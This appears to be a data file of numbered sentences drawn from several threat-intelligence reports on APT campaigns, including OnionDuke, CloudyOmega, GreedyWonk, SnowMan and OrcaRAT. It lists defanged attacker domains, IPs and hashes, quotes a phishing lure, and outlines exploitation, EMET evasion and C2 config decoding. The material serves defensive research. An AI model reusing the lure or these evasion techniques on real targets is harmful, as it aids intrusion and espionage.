piques our attention .", "4896": "Naturally , our first priority is ensuring that we detect the new or altered TTPs .", "4897": "But we also attempt to figure out why the adversary changed - what broke ? - so that we can predict if and when they will change again in the future .", "4898": "We observed an example of this phenomenon around May .", "4899": "The previous versions of Aumlib had not changed since at least May 2011 , and Ixeshe had not evolved since at least December 2011 .", "4900": "We can not say for sure whether the attackers were responding to the scrutiny they received in the wake of the episode .", "4901": "But we do know the change was sudden .", "4902": "Akin to turning a battleship , retooling TTPs of large threat actors is formidable .", "4903": "Such a move requires recoding malware , updating infrastructure , and possibly retraining workers on new processes .", "4904": "The following sections detail the changes to Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe .", "4905": "Aumlib has been used in targeted attacks for years .", "4906": "The sample , which was deployed against an organization involved in shaping economic policy , was downloaded from the following URL : The sample generated the following traffic : This output reveals the following changes when compared with earlier variants : The POST URI is changed to /bbs/search.asp ( as mentioned , earlier Aumlib variants used a POST URI of /bbs/info.asp .", "4907": "Additional requests from the sample generated the following traffic : These subtle changes may be enough to circumvent existing IDS signatures designed to detect older variants of the Aumlib family .", "4908": "The sample 832f5e01be536da71d5b3f7e41938cfb shares code with an older Aumlib variant with the hash cb3dcde34fd9ff0e19381d99b02f9692 .", "4909": "Ixeshe has been used in targeted attacks since 2009 , often against entities in East Asia .", "4910": "The mark for this particular attack was [ ll65 ] .", "4911": "Based on our observations , the most successful threat actors evolve slowly and deliberately .", "4912": "So when they do change , pay close attention .", "4913": "Knowing how attackers ' strategy is shifting is crucial to detecting and defending against today 's advanced threats .", "4914": "But knowing the '' why '' is equally important .", "4915": "That additional degree of understanding can help organizations forecast when and how a threat actor might change their behavior - because if you successfully foil their attacks , they probably will .", "4916": "This entry was posted in Threat Intelligence , Threat Research by Ned Moran and Nart Villeneuve .", "4917": "Bookmark the permalink .", "4918": "Naturally this piqued our interest , so we decided to peer down the rabbit hole .", "4919": "Suffice to say , the hole was a lot deeper than we expected ! In fact , it went all the way back to the notorious Russian APT family MiniDuke , known to have been used in targeted attacks against NATO and European government agencies .", "4920": "The malware used in this case is , however , not a version of MiniDuke .", "4921": "It is instead a separate , distinct family of malware that we have since taken to calling OnionDuke .", "4922": "But lets start from the beginning .", "4923": "When a user attempts to download an executable via the malicious Tor exit node , what they actually receive is an executable '' wrapper '' that embeds both the original executable and a second , malicious executable .", "4924": "Upon execution , the wrapper will proceed to write to disk and execute the original executable , thereby tricking the user into believing that everything went fine .", "4925": "However , the wrapper will also write to disk and execute the second executable .", "4926": "In all the cases we have observed , this malicious executable has been the same binary ( SHA1 : a75995f94854dea8799650a2f4a97980b71199d2 , detected as Trojan-Dropper : W32/OnionDuke.A ) .", "4927": "In reality , the resource is actually an encrypted dynamically linked library ( DLL ) file .", "4928": "It should be noted , that we believe all five domains contacted by the malware are innocent websites compromised by the malware operators , not dedicated malicious servers .", "4929": "Through our research , we have also been able to identify multiple other components of the OnionDuke malware family .", "4930": "One component , however , is an interesting exception .", "4931": "What makes the overpict.com domain interesting , is it was originally registered in 2011 with the alias of '' John Kasai '' .", "4932": "Within a two-week window , '' John Kasai '' also registered the following domains : airtravelabroad.com , beijingnewsblog.net , grouptumbler.com , leveldelta.com , nasdaqblog.net , natureinhome.com , nestedmail.com , nostressjob.com , nytunion.com , oilnewsblog.com , sixsquare.net and ustradecomp.com .", "4933": "This strongly suggests that although OnionDuke and MiniDuke are two separate families of malware , the actors behind them are connected through the use of shared infrastructure .", "4934": "However , it would seem that the OnionDuke family is much older , both based on older compilation timestamps and also on the fact that some of the embedded configuration data make reference to an apparent version number of 4 suggesting that at least three earlier versions of the family exist .", "4935": "During our research , we have also uncovered strong evidence suggesting that OnionDuke has been used in targeted attacks against European government agencies , although we have so far been unable to identify the infection vector ( s ) .", "4936": "Interestingly , this would suggest two very different targeting strategies .", "4937": "On one hand is the '' shooting a fly with a cannon '' mass-infection strategy through modified binaries and , on the other , the more surgical targeting traditionally associated with APT operations .", "4938": "In any case , although much is still shrouded in mystery and speculation , one thing is certain .", "4939": "While using Tor may help you stay anonymous , it does at the same time paint a huge target on your back .", "4940": "It 's never a good idea to download binaries via Tor ( or anything else ) without encryption .", "4941": "The problem with Tor is that you have no idea who is maintaining the exit node you are using and what their motives are .", "4942": "VPNs ( such as our Freedome VPN ) will encrypt your connection all the way through the Tor network , so the maintainers of Tor exit nodes will not see your traffic and ca n't tamper with it .", "4943": "Samples :", "4944": "In this day and age of interconnected cloud services and distributed content delivery networks ( CDNs ) , it is important for both CDN service providers and security professionals alike to recognize and understand the risks that these systems can introduce within an modern enterprise .", "4945": "For organizations within both public and private sectors that leverage CDN platforms to dynamically deliver web content , it is important that the content is also routinely monitored .", "4946": "Otherwise , malicious third-party content can be loaded into a target organization 's website without their knowledge , delivering untold risks to unwitting visitors .", "4947": "The compromised CDN resource in question is a JavaScript file hosted at [ http : ] //cdn.afghanistan [ .", "4948": "] af/scripts/gop-script.js The domain cdn.afghanistan [ .", "4949": "] af is a legitimate CDN site used by the Afghan Ministry of Communications and IT ( MCIT ) to host web content that is displayed and used on many official gov.af websites .", "4950": "The javascript URL ( [ http : ] //cdn.afghanistan [ .", "4951": "] af/scripts/gop-script.js ) is called from numerous official Afghan Government websites , including the following : It is likely that this javascript URL itself is normally legitimate , but the attackers obtained access to the file and prepended the following malicious JavaScript functions to the beginning of the script : Note that the gov.af websites would not need to be compromised individually for this attack to be delivered to visitors of the sites , because it is the backend CDN infrastructure that is serving up the malicious script .", "4952": "Judging by the last modified timestamp on the HTTP response of gop-script.js , which is Tue , 16 Dec 2014 08:07:06 GMT , this malicious CDN compromise was very recent in nature .", "4953": "In fact , it occurred on the very same day that China 's Prime Minister Li Keqiang would meet with Abdullah Abdullah , the Chief Executive Officer of Afghanistan in Astana Kazakhstan , they would discuss infrastructure development and bilateral cooperation issues .", "4954": "Looking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the Chinese embassy website we note a Tue , 16 December 2014 07:43:31 modify time as well as the www.news [ .", "4955": "] cn watermark in the bottom righthand corner .", "4956": "This indicates that the image of Keqiang and Abdullah was likely taken and edited sometime prior to 07:43:31 .", "4957": "While it is ambiguous as to which timezone the edits actually took place in ( Kazakhstan or China ) we assume the date timestamp references GMT because the press release states '' In the afternoon of December 15 local time\u2026 '' If we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma-Ata standard time ( +0600 ) this would closely correspond with a 07:43 GMT time stamp .", "4958": "The modification of the gop-script.js by the attackers at 08:07:06 GMT likely tracks extremely close to a window of a few hours in which Keqiang met with Abdullah .", "4959": "It is worth mentioning that a similar scenario occurred on June 20th when security researcher PhysicalDrive0 observed a malicious Java file hosted on the Embassy of Greece in Beijing .", "4960": "At the time , a Chinese delegation led by Keqiang was visiting Greek Prime Minister Antonis Samaras in Athens .", "4961": "Security researcher R136a1 aka '' thegoldenmessenger '' released a followup blog with detailed analysis of the Greek embassy compromise .", "4962": "While these two separate events are not directly related , additional research into the status of ministerial and official government websites on or around the dates of notable Chinese delegations and or bilateral meetings may yield additional patterns of interest .", "4963": "Upon closer inspection of the prepended malicious JavaScript code , one will notice the similarity in the update.javaplug-in [ .", "4964": "] com naming convention and URL structure to the C2 domain java-se [ .", "4965": "] com found in the Palo Alto Networks blog post Attacks on East Asia using Google Code for Command and Control and associated with Operation Poisoned Hurricane .", "4966": "However , the malicious document.write driveby URLs listed above both result in 403 Forbidden errors as of December 18 , 2014 .", "4967": "While the 403 Forbidden errors may seem like an analytic dead end , the TCIRT also identified a malicious Java applet submission to VirusTotal that confirms the nature of this malicious activity .", "4968": "This Java applet , SHA1 : 388E6F41462774268491D1F121F333618C6A2C9A , has no antivirus detections as of December 21st .", "4969": "The applet contains its malicious class file at the path '' jre7u61windows/x86/Update.class '' .", "4970": "Using historic context archived within ThreatConnect , the TCIRT concluded that this Java applet is from the same source code as the applet SHA1 : ADC162DD909283097E72FC50B7AB0E04AB8A2BCC , which was previously observed by the TCIRT at the Operation Poisoned Hurricane related URL [ http : ] //jre7.java-se [ .", "4971": "] com/java.jar on August 15 , 2014 .", "4972": "This same certificate was also used to sign the Java applet that downloaded this malware .", "4973": "Note that javaplug-in [ .", "4974": "] com is the same root domain found in the compromised version of [ http : ] //cdn.afghanistan [ .", "4975": "] af/scripts/gop-script.js as [ http : ] //update.javaplug- in [ .", "4976": "] com/o/j.js , confirming that this Java malware is in fact directly associated with the Afghan MCIT CDN XSS compromise .", "4977": "Full indicators of this activity and a YARA rule to detect the malware certificate can be found in the ThreatConnect Common Community under Incident 20141217A : Afghan Government Java Driveby and signature APTOnAndOncert.yara .", "4978": "As the US and NATO reduce their troop levels in Afghanistan , China is posturing to fill the gap of influence that the west is leaving behind .", "4979": "With plans to facilitate multilateral peace talks with the Taliban and establish major transportation projects which aim to bolster the Afghan economy , Beijing has been eyeing Afghanistan as part of its broader South Asian strategy .", "4980": "It is important to consider that corporate enterprises are not immune to this tactic , and this is not just a technique that is used by APT threat actors .", "4981": "If an enterprise 's website leverages a CDN to speed up content delivery , unintended consequences must be anticipated .", "4982": "Fortunately , modern browsers now implement a security concept called '' Content Security Policy '' .", "4983": "As long as the server 's response headers are configured properly , third party content may be restricted to originating from a narrow whitelist .", "4984": "Just as attackers distribute malicious content to users en masse or CDN services distribute web content to users , security professionals must be able to quickly distribute actionable Threat Intelligence in formats readable by both humans and machines .", "4985": "ThreatConnect is the industry 's first comprehensive Threat Intelligence Platform that enables enterprises to orchestrate the aggregation of Threat Intelligence from multiple sources , use integrated analytics and a robust API that gives enterprises the control to action their own Threat Intelligence , in the cloud and on premises .", "4986": "Register for a free account now to view the Common Community shares and more .", "4987": "This actor initiated their most recent campaign on November 19 , 2014 targeting multiple organizations .", "4988": "The attacker leveraged multiple exploits , targeting both CVE-2014-6332 and CVE-2014-4113 .", "4989": "The use of CVE-2014-6332 is notable , as it demonstrates that multiple classes of actors , both criminal and APT alike , have now incorporated this exploit into their toolkits .", "4990": "Further , the use of both of these two known vulnerabilities in tandem is notable for APT3 .", "4991": "This actor is historically known for leveraging zero- day vulnerabilities in widespread but infrequent phishing campaigns .", "4992": "The use of known exploits and more frequent attacks may indicate both a shift in strategy and operational tempo for this group .", "4993": "The body of the message is below : One Month 's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS 4,000 MODELS Nude Celebrities , Playmates , Cybergirls & More ! Click hxxp : //join.playboysplus.com/signup/ To Get a Free Plus Member Now & Never Miss Another Update .", "4994": "Your Member referrals must remain active .", "4995": "If anyone getting '' Promotion not available '' for 1 month free membership , you might get the issue up to 48 hrs once your membership is expired and make sure to Clear out cookies or use another browser or use another PC .", "4996": "These files have the following metadata : These payload files also have interesting PDB debug strings .", "4997": "The most interesting PDB string is the '' 4113.pdb , '' which appears to reference CVE-2014-4113 .", "4998": "These first three bytes are the command identifier .", "4999": "] com \u2013 another known domain referenced in our Operation Clandestine Fox blog .", "5000": "In addition , the join.playboysplus [ .", "5001": "] com exploit and payload delivery site resolves to 104.151.248.173 .", "5002": "Since Operation Clandestine Fox , we have observed this actor execute multiple attacks that did not rely on zero-day exploits .", "5003": "The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code .", "5004": "No matter the strategy , this actor has shown an ability to operate successfully .", "5005": "IOCs for this threat can be found here .", "5006": "JustSystems has issued an update to its Ichitaro product line ( Japanese office suite software ) , plugging a zero-day vulnerability .", "5007": "This vulnerability is being actively exploited in the wild to specifically target Japanese organizations .", "5008": "The content of the emails vary depending on the business interest of the targeted recipient 's organization ; however , all are about recent political events associated with Japan .", "5009": "Often such exploitation attempts crash and then relaunch the document viewer to open a clean document in order to trick users into believing it is legitimate .", "5010": "In this particular attack , opening the document and dropping the payload are done without crashing Ichitaro and , as such , users have no visual indications as to what is really happening in the background .", "5011": "As Security Response previously discussed , unpatched vulnerabilities being exploited is nothing new for Ichitaro .", "5012": "However , during our investigation of this Ichitaro zero-day attack , we discovered that the attack was in fact part of an ongoing cyberespionage campaign specifically targeting various Japanese organizations .", "5013": "Symantec has named this attack campaign CloudyOmega .", "5014": "However , some of the files exploit software vulnerabilities , and the aforementioned vulnerability in Ichitaro software is only one of them .", "5015": "This blog provides insights into the history of the attack campaign , infection methods , malware payload , and the group carrying out the attacks .", "5016": "The first attack of the campaign can be traced back to at least 2011 .", "5017": "Figure 1 shows the targeted sectors and the number of attacks carried out each year .", "5018": "The perpetrators were very cautious launching attacks in the early years with attacks beginning in earnest in 2014 .", "5019": "By far , the public sector in Japan is the most targeted sector hit by Operation CloudyOmega .", "5020": "This provides some clue as to who the attack group is .", "5021": "Email is the predominant infection vector used in this campaign .", "5022": "Figure 2 is an example of an email used in recent attacks prior to those exploiting the Ichitaro zero-day vulnerability .", "5023": "Ironically , the attackers follow security best practices by indicating in the first email that the password will be sent to the recipient in a separate email .", "5024": "The body of the email is very short and claims the attachment includes a medical receipt .", "5025": "The file in the attachment has a Microsoft Word icon but , as indicated within Windows Explorer , it is an executable file .", "5026": "The malware is exclusively used in the CloudyOmega attack campaign and first appeared in 2011 when it was used in an attack against a Japanese chemical company .", "5027": "Each Emdivi variant has a unique version number and belongs to one of two types : Type S and Type T .", "5028": "The unique version number is not only a clear sign that Emdivi is systematically managed , but it also acts as an encryption key .", "5029": "Both Emdivi Type S and Type T share the following functionality : Type T is primarily used in Operation CloudyOmega , has been in constant development since the campaign was first launched in 2011 , and is written in the C++ programing language .", "5030": "However , protection mechanisms and encryption , essential features for threat survival , are not present in Type S. One interesting trait of Type S is that it uses Japanese sentences that seem to be randomly taken from the internet to change the file hash .", "5031": "For instance , in the example shown in Figure 4 , it uses a sentence talking about the special theory of relativity .", "5032": "So far , a total of 50 unique domains have been identified from 58 Emdivi variants .", "5033": "Almost all websites used as C & C servers are compromised Japanese websites ranging from sites belonging to small businesses to personal blogs .", "5034": "We discovered that 40 out of the 50 compromised websites , spread across 13 IP addresses , are hosted on a single cloud-hosting service based in Japan .", "5035": "The compromised sites are hosted on various pieces of web server software , such as Apache and Microsoft Internet Information Services ( IIS ) , and are on different website platforms .", "5036": "This indicates that the sites were not compromised through a vulnerability in a single software product or website platform .", "5037": "The compromised cloud hosting company has been notified but , at the time of writing , has not replied .", "5038": "Symantec offers two IPS signatures that detect and block network communication between infected computers and the Emdivi C & C server : During our research , multiple samples related to this attack campaign were identified and allowed us to connect the dots , as it were , when it came to CloudyOmega 's connections to other attack groups .", "5039": "In August 2012 , the CloudyOmega attackers exploited the zero-day Adobe Flash Player and AIR 'copyRawDataTo ( ) ' Integer Overflow Vulnerability ( CVE-2012-5054 ) in an attack against a high-profile organization in Japan .", "5040": "As CVE- 2012-5054 was publicly disclosed in the same month , the attack utilized what was , at the time , a zero-day exploit .", "5041": "Interestingly , the Flash file that was used in an Emdivi attack in 2012 and the one used in the LadyBoyle attack in 2013 look very similar .", "5042": "Figure 6 shows the malformed SWF file executing LadyBoyle ( ) code that attempts to exploit the Adobe Flash Player CVE-2013-0634 Remote Memory Corruption Vulnerability ( CVE-2013-0634 ) .", "5043": "The Flash file seems to have been created using the same framework used by the CloudyOmega group , but with a different exploit .", "5044": "Both attacks use a .doc", "5045": "No other evidence connects these two different campaigns ; however , as described previously in Symantec Security Response 's Elderwood blog , it is strongly believed that a single parent organization has broken into a number of subgroups that each target a particular industry .", "5046": "In terms of the latest attack on Ichitaro , we collected a dozen samples of JTD files , all of which are exactly the same except for their payload .", "5047": "The parent organization , it would seem , supplied the zero-day exploit to the different subgroups as part of an attack toolkit and each group launched a separate attack using their chosen malware .", "5048": "This is why three different payloads ( Backdoor.Emdivi , Backdoor.Korplug , and Backdoor.ZXshell ) were observed in the latest zero-day attack .", "5049": "Operation CloudyOmega was launched by an attack group that has communication channels with other notorious attack groups including Hidden Lynx and the group responsible for LadyBoyle .", "5050": "CloudyOmega has been in operation since 2011 and is persistent in targeting Japanese organizations .", "5051": "With the latest attack employing a zero-day vulnerability , there is no indication that the group will stop their activities anytime soon .", "5052": "Symantec Security Response will be keeping a close eye on the CloudyOmega group .", "5053": "It is highly recommended that customers using Ichitaro products apply any patches as soon as possible .", "5054": "Symantec offers the following protection against attacks associated with Operation CloudyOmega :", "5055": "Less than a week after uncovering Operation SnowMan , the FireEye Dynamic Threat Intelligence cloud has identified another targeted attack campaign - this one exploiting a zero-day vulnerability in Flash .", "5056": "We are collaborating with Adobe security on this issue .", "5057": "Adobe has assigned the CVE identifier CVE-2014- 0502 to this vulnerability and released a security bulletin .", "5058": "We 're dubbing this attack '' Operation GreedyWonk .", "5059": "'' We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer , based on consistencies in tradecraft ( particularly with the websites chosen for this strategic Web compromise ) , attack infrastructure , and malware configuration properties .", "5060": "On Feb. 13 , FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash Player ( 12.0.0.4 and 11.7.700.261 ) .", "5061": "All three organizations are nonprofit institutions ; the Peterson Institute and Smith Richardson Foundation engage in national security and public policy issues .", "5062": "If you have Java 1.6 , update Java to the latest 1.7 version .", "5063": "If you are using an out-of-date Microsoft Office 2007 or 2010 , update Microsoft Office to the latest version .", "5064": "These mitigations do not patch the underlying vulnerability .", "5065": "But by breaking the exploit 's ASLR-bypass measures , they do prevent the current in-the-wild exploit from functioning .", "5066": "GreedyWonk targets a previously unknown vulnerability in Adobe Flash .", "5067": "Details of these techniques are available from our previous blog post on the subject ( in the '' Non-ASLR modules '' section ) .", "5068": "Java 1.6 is no longer supported and does not receive security updates .", "5069": "In addition to the MSVCR71.dll ASLR bypass , a variety of widely exploited code-execution vulnerabilities exist in Java 1.6 .", "5070": "That 's why FireEye strongly recommends upgrading to Java 1.7 .", "5071": "The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013 .", "5072": "More details about this bypass are addressed by Microsoft 's Security Bulletin MS13-106 and an accompanying blog entry .", "5073": "FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches .", "5074": "This PlugX sample was compiled on Feb. 12 , one day before we first observed it , indicating that it was deployed specifically for this campaign .", "5075": "] name and adservice.no-ip [ .", "5076": "] org resolved to 74.126.177.68 on Feb. 18 , 2014 .", "5077": "Passive DNS analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4 , 2013 and July 15 , 2013 and 192.74.246.219 on Feb. 17 , 2014 .", "5078": "java.ns1 [ .", "5079": "] name also resolved to 192.74.246.219 on February 18 .", "5080": "This exploit server hosted a Flash exploit file named BrightBalls.swf ( MD5 1ec5141051776ec9092db92050192758 ) .", "5081": "Using passive DNS analysis , we see the domains windows.ddns [ .", "5082": "] us and wmi.ns01 [ .", "5083": "] us both resolved to 76.73.80.188 in mid-2012 .", "5084": "The domain ids.ns01 [ .", "5085": "] us also overlaps with the domain wmi.ns01 [ .", "5086": "] us on the IP 194.183.224.75 .", "5087": "This threat actor clearly seeks out and compromises websites of organizations related to international security policy , defense topics , and other non-profit sociocultural issues .", "5088": "The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically .", "5089": "Based on these and other observations , we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid- term .", "5090": "As the pro-democracy movement in Hong Kong has continued , we 've been watching for indications of confrontation taking place in cyberspace .", "5091": "Protests began in September and have continued to escalate .", "5092": "Additionally , at least one member of the popular online forum HKGolden was arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement .", "5093": "The use of DDoS attacks as a political tool during times of conflict is not new ; patriotic hacktivist groups frequently use them as a means to stifle political activity of which they disapprove .", "5094": "The question of state sponsorship ( or at least tacit approval ) in online crackdowns is often up for debate and ambiguous from a technical evidence and tradecraft perspective .", "5095": "In this case , however , we 've discovered an overlap in the tools and infrastructure used by China-based advanced persistent threat ( APT ) actors and the DDoS attack activity .", "5096": "We believe that these DDoS attacks are linked to previously observed APT activity , including Operation Poisoned Hurricane .", "5097": "This correlation sheds light on the potential relationships , symbiosis and tool sharing between patriotic hacker activities designed to disrupt anti-government activists in China , and the APT activity we consistently see that is more IP theft and espionage-focused .", "5098": "Next Media is a large media company in Hong Kong and the HkGolden forum has been used as a platform to organize pro-democracy protests .", "5099": "All of the samples we identified have the '' NewVersion '' value of 20140926 .", "5100": "The full list of C2 servers we identified is as follows : On Oct. 21 , the control server at wakayamasatei [ .", "5101": "] com responded with the following encoded configuration file : This configuration file can be decoded by stripping the leading and trailing @ $ @ characters .", "5102": "At this point , a simple base64 and XOR decode will reveal the plaintext configuration .", "5103": "The two different keys are 0x2A or 0x7E .", "5104": "The IP 58.64.139.10 has hosted hkgolden [ .", "5105": "] com \u2013 the domain for the HKGolden forum mentioned above .", "5106": "The IP 124.217.214.149 hosted the attacker controlled domain p.java-sec [ .", "5107": "] com .", "5108": "It should come as no surprise that hkgolden [ .", "5109": "] com , nextmedia [ .", "5110": "] com , and appledaily.com [ .", "5111": "] hk websites are now or previously have been blocked by the Great Firewall of China \u2013 indicating that the PRC has found the content hosted on these sites objectionable .", "5112": "The most direct connection between these DDoS attacks and previous APT activity is the use of the QTI International and CallTogether code signing certificates , which we have seen in malware attributed to APT activity .", "5113": "The QTI International digital certificate has been previously used to sign binaries used in APT activity including Operation Poisoned Hurricane .", "5114": "Specifically , 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX variant signed by the QTI International certificate .", "5115": "The sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as well .", "5116": "This sample was first observed during a drive-by attack in June 2014 , and was downloaded from java-se [ .", "5117": "] com/jp.jpg .", "5118": "The QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed .", "5119": "The java-se [ .", "5120": "] com website was previously used in other attacks targeting the pro-democracy movement in Hong Kong .", "5121": "We first observed the presence of malicious javascript inserted into Hong Kong Association for Democracy and People's Livelihood on June 26 , 2014 , which appeared as the following : More recently , as noted by Claudio Guarnieri , the website of the Democratic Party of Hong Kong was seen hosting a redirect to the same malicious javascript .", "5122": "The CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5 .", "5123": "We also found that the hkgolden [ .", "5124": "] com website was compromised on Sept. 5 , 2014 and had a redirect to a malicious javascript again hosted at another jave-se [ .", "5125": "] com host , which appeared as follows : Finally , as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec [ .", "5126": "] com between Oct. 25 , 2014 and Oct. 27 , 2014 .", "5127": "As Brandon Dixon noted here , the java-sec [ .", "5128": "] com domain is linked to the java- se [ .", "5129": "] com by shared hosting history at the following IP address : It is unclear why these actors would attack an IP address they were actively using .", "5130": "It 's possible that the attackers wanted to test their botnet 's capability by attacking an IP they were using to gather statistics on the size of the attack .", "5131": "It is also possible that the attackers simply made a mistake and accidentally issued commands to attack their own infrastructure .", "5132": "While not conclusive , the evidence presented above shows a link between confirmed APT activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy movement in Hong Kong .", "5133": "The evidence does not conclusively prove that the same actors responsible for the DDoS attacks are also behind the observed intrusion activity discussed above \u2013 such as Operation Poisoned Hurricane .", "5134": "Rather , the evidence may indicate that a common quartermaster supports both the DDoS attacks and ongoing intrusion activity .", "5135": "In either scenario , there is a clear connection between the intrusion activity documented in Operation Poisoned Hurricane and the DDOS attacks documented here .", "5136": "While the tactics of these activities are very different from a technical perspective , each supports distinct political objectives .", "5137": "Operation Poisoned Hurricane 's objective appeared to have in part been IP theft possibly for economic gain or other competitive advantages .", "5138": "In the DDOS attacks , the objective was to silence free speech and suppress the pro democracy movement in Hong Kong .", "5139": "The Chinese government is the entity most likely to be interested in achieving both of these objectives .", "5140": "This entry was posted in Threat Intelligence , Threat Research and tagged advanced malware , Cybersecurity , malware , zero-day by Ned Moran , Mike Oppenheim and Mike Scott .", "5141": "Bookmark the permalink .", "5142": "We believe the attack is a strategic Web compromise targeting American military personnel amid a paralyzing snowstorm at the U.S. Capitol in the days leading up to the Presidents Day holiday weekend .", "5143": "Based on infrastructure overlaps and tradecraft similarities , we believe the actors behind this campaign are associated with two previously identified campaigns ( Operation DeputyDog and Operation Ephemeral Hydra ) .", "5144": "This blog post examines the vulnerability and associated attacks , which we have dubbed '' Operation SnowMan .", "5145": "'' After compromising the VFW website , the attackers added an iframe into the beginning of the website's HTML code that loads the attacker 's page in the background .", "5146": "The attacker 's HTML/JavaScript page runs a Flash object , which orchestrates the remainder of the exploit .", "5147": "The exploit includes calling back to the IE 10 vulnerability trigger , which is embedded in the JavaScript .", "5148": "The exploit targets IE 10 with Adobe Flash .", "5149": "So installing EMET or updating to IE 11 prevents this exploit from functioning .", "5150": "The vulnerability is a previously unknown use-after-free bug in Microsoft Internet Explorer 10 .", "5151": "Then the exploit code parses the error resulting from the XML load order to determine whether the load failed because the EMET DLL is not present .", "5152": "The exploit proceeds only if this check determines that the EMET DLL is not present .", "5153": "For example , the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory .", "5154": "We have discussed this technique and other ASLR bypass approaches in our blog .", "5155": "One minor difference between the previous approaches and this attack is the heap spray address , which was changed to 0x1a1b2000 in this exploit .", "5156": "After successful exploitation , the code repairs the corrupted Flash Vector and flash.Media.Sound to continue execution .", "5157": "The beginning of the file is a JPG image ; the end of the file ( offset 36321 ) is the payload , encoded with an XOR key of 0\u00d795 .", "5158": "The attacker appends the payload to the shellcode before pivoting to code control .", "5159": "The compile date of the payload was 2014-02-11 , and the last modified date of the exploit code was also 2014-02-11 .", "5160": "This suggests that this instantiation of the exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of Foreign Wars website .", "5161": "A possible objective in the SnowMan attack is targeting military service members to steal military intelligence .", "5162": "In addition to retirees , active military personnel use the VFW website .", "5163": "It is probably no coincidence that Monday , Feb. 17 , is a U.S. holiday , and much of the U.S. Capitol shut down Thursday amid a severe winter storm .", "5164": "This domain currently resolves to 118.99.60.142 .", "5165": "The domain info [ .", "5166": "] flnet [ .", "5167": "] org also resolved to this IP address on 2014-02-12 .", "5168": "The info [ .", "5169": "] flnet [ .", "5170": "] org domain overlaps with icybin [ .", "5171": "] flnet [ .", "5172": "] org and book [ .", "5173": "] flnet [ .", "5174": "The threat actor responsible for Operation DeputyDog also used the '' HTTPS '' version of the Gh0st .", "5175": "The me [ .", "5176": "] scieron [ .", "5177": "] com domain previously resolved to 58.64.199.22 .", "5178": "The book [ .", "5179": "] flnet [ .", "5180": "] org domain also resolved to another IP in the same subnet 58.64.199.0/24 .", "5181": "Specifically , book [ .", "5182": "] flnet [ .", "5183": "] org previously resolved to 58.64.199.27 .", "5184": "Others domain seen resolving to this same /24 subnet were dll [ .", "5185": "] freshdns [ .", "5186": "] org , ali [ .", "5187": "] blankchair [ .", "5188": "] com , and cht [ .", "5189": "] blankchair [ .", "5190": "] com .", "5191": "The domain dll [ .", "5192": "] freshdns [ .", "5193": "] org resolved to 58.64.199.25 .", "5194": "Both ali [ .", "5195": "] blankchair [ .", "5196": "] com and cht [ .", "5197": "] blankchair [ .", "5198": "] com resolved to 58.64.199.22 .", "5199": "A number of other related domains resolve to these IPs and other IPs also in this /24 subnet .", "5200": "For the purposes of this blog , we 've chosen to focus on those domains and IP that relate to the previously discussed DeputyDog and Ephemeral Hydra campaigns .", "5201": "Figure 1 illustrates the infrastructure overlaps and connections we observed between the strategic Web compromise campaign leveraging the VFW 's website , the DeputyDog , and the Ephemeral Hydra operations .", "5202": "Other tradecraft similarities between the actor ( s ) responsible for this campaign and the actor ( s ) responsible for the DeputyDog/Ephemeral Hydra campaigns include : We observed many similarities from the exploitation side as well .", "5203": "At a high level , this attack and the CVE- 2013-3163 attack both leveraged a Flash file that orchestrated the exploit , and would call back into IE JavaScript to trigger an IE flaw .", "5204": "The code within the Flash files from each attack are extremely similar .", "5205": "This entry was posted in Advanced Malware , Exploits , Targeted Attack , Threat Research , Vulnerabilities and tagged 0day , zero-day by Darien Kindlund , Dan Caselden , Xiaobo Chen , Ned Moran and Mike Scott .", "5206": "Bookmark the permalink .", "5207": "By Dan Kelly and Tom Lancaster It 's every malware analyst 's dream to be handed a sample which is , so far , unnamed by the AV community - especially when the malware in question may have links to a well - known APT group .", "5208": "In my line of work I analyse several ' unknown ' malware samples a week , but often it turns out that they are simply new variants of existing malware families .", "5209": "Recently I was fortunate enough to be handed something that not only had a low detection rate but , aside from heuristics , seemed to be relatively unknown to the top 40 anti - virus companies .", "5210": "In this post I will walk you through the malware family we 've dubbed \" OrcaRAT \" .", "5211": "First of all , it is worth pointing out that most of the malware I see on a day - to - day basis is espionage orientated , and very rarely do the programmers and operators make much effort to cover their tracks .", "5212": "The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent .", "5213": "The malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo[1 ] malware and happened across a malware sample ( 253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613 ) he did n't recognise .", "5214": "He immediately took the malware and passed it through first stage analysis , which involves running the file in a sandbox environment .", "5215": "After this , he handed it over for more in - depth capability analysis .", "5216": "The structure I began by looking over the sandbox report .", "5217": "The first thing that drew my attention was the URI structure .", "5218": "( A screenshot showing the HTTP headers and URI structure that OrcaRAT produces ) To those of us who are familiar with decoding data , you will notice that the URI string formatting appears to be a modified version of the Base64 algorithm .", "5219": "To understand this structure more , we must reverse engineer the functions that generate and then encode the data .", "5220": "Firstly we begin by analysing the routines that produce the data which is later encoded and sent in the HTTP URI field .", "5221": "The very first thing that jumped out when disassembling the malware is the simplicity and cleanliness of the code .", "5222": "There are also a significant number of Windows Crypto API[2 ] functions imported by the malware , so we can assume this indicates that it uses encryption .", "5223": "( A screenshot showing the functions that are imported by OrcaRAT ) Delving deeper in to the disassembly , we come across the preamble to the URI generation function .", "5224": "( A screenshot showing the 